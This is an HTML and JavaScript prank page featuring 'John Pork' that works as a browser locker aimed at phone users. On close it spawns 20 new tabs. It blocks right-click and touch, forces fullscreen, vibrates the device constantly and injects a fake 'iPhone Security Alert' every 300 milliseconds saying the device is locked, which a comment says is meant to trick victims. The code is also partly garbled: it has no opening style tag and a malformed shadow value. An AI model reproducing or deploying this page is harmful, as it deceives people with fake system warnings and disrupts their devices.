<!DOCTYPE html>
<html>
<head>

            margin: 0;
            padding: 0;

            background-color: black;
            position: fixed;
            top: 0;
            left: 0;

            height: 100%;
            cursor: none; /* Hide cursor */ touch-action: none; /* Disable touch gestures */
        } img {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);            width: 80%;
            max-width: 300px;
        } #message {
            position: absolute;
            bottom: 20px;

            text-shadow: 2px 2px 4px black;
        } </style>
</head>
<body>
    <img src="https://th.bing.com/th/id/OIP.hGqGfvoqvtAkSImoB1ajEwHaNl?w=132&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="John Pork"> <div id="message">Hi, I'm John Pork!</div>
    <audio id="audio" autoplay loop>
        <source src="Jhonprok.mp3" type="audio/mpeg"> <!-- Replace with your audio -->
    </audio>
    <script>
        // Force fullscreen (iOS Safari)        function enterFullscreen() {            const elem = document.documentElement;
            if (elem.requestFullscreen) {                elem.requestFullscreen().catch(err => {});
            } else if (elem.webkitRequestFullscreen) { /* Safari */                elem.webkitRequestFullscreen().catch(err => {});
            } else if (elem.msRequestFullscreen) { /* IE11 */ elem.msRequestFullscreen().catch(err => {});            }
        }        enterFullscreen();

        // Spam new tabs if user tries to close
        window.onbeforeunload = function() {
            for (let i = 0; i < 20; i++) {
                window.open(window.location.href, '_blank'); }
            return "You can't leave!";        };        // Disable right-click, touch events, etc.
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('touchstart', e => e.preventDefault(), { passive: false }); // Fake iOS alert (tricks victims into thinking it's a system message)
        function fakeAlert() {            const alert = document.createElement('div');            alert.style.position = 'fixed';
            alert.style.top = '50%';
            alert.style.left = '5%';
            alert.style.width = '90%';
            alert.style.backgroundColor = 'white';
            alert.style.border = '1px solid #ccc';
            alert.style.borderRadius = '15px';
           alert.style.padding = '20px';
           alert.style.boxShadow = '0 4px 8px rgba(0, ));';
           alert.style.zIndex = '9999';
           alert.style.textAlign = 'center';
           alert.innerHTML = `               <h3>iPhone Security Alert</h3>
               <p>Your device has been locked for security reasons.</p> <p>Tap "OK" to unlock.</p> <button onclick="this.parentElement.remove()">OK</button>
           `;           document.body.appendChild(alert);       } setInterval(fakeAlert, 300); // Spam fake alerts

       // Vibrate phone (if supported)
       if (navigator.vibrate) {           setInterval(() => navigator.vibrate(1), 10); // Constant vibration
       } </script>
